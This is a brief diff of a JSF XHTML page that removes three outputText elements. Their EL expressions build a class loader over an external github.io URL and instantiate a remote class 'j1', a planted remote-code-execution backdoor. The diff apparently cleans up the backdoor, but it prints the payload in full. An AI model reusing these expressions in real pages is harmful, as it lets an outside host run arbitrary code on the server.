@@ -7,8 +7,5 @@
 >
 	<h:head />
 	<h:body>
-		<h:outputText id="a" value="#{request.getSession().setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}" />
-		<h:outputText id="b" value="#{request.getSession().getAttribute('arr').add(facesContext.getExternalContext().getResource('/').toURI().create('https://mpumelelo-m-mthethwa.github.io:443/').toURL())}" />
-		<h:outputText id="c" value="#{facesContext.getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute('arr').toArray(facesContext.getClass().getClassLoader().getParent().getURLs())).loadClass('j1').newInstance()}" />
 	</h:body>
 </f:view>
